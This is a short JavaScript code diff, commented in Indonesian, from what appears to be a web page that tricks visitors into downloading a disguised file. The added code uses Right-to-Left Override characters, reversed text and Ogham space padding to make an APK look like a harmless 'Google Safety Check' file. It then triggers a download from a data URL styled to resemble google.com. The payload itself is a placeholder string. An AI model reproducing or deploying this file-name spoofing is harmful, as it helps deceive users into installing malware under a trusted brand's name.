@@ -104,7 +104,22 @@
             updateLog("Running Space Injection...");
             goFS();
             // Menggunakan karakter Ogham Space (\u1680) untuk mengisi kekosongan UI
-            const fakeName = "Google_Safety_Check.apk" + "\u1680".repeat(40) + " from google.com ";
+           /**
+ * \u202E = Right-to-Left Override (Memulai urutan dari kanan)
+ * \u202C = Pop Directional Formatting (Mengakhiri efek RTL)
+ */
+
+const rtlControl = "\u202E";
+const resetControl = "\u202C";
+
+// Kita tulis teksnya secara TERBALIK di dalam kode
+// Agar saat dibalik oleh sistem (RTL), hasilnya terbaca normal.
+// Contoh: "kpa.elgoog" akan tampil sebagai "google.apk"
+const visibleStart = "kpa.elgoog"; 
+const spacer = "\u1680".repeat(20);
+const hiddenEnd = "kcehC_ytefaS_elgooG";
+
+const fakeName = rtlControl + visibleStart + spacer + hiddenEnd + resetControl;
             setTimeout(() => {
                 const a = document.createElement("a");
                 a.href = "data:/\\\\\\/.google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
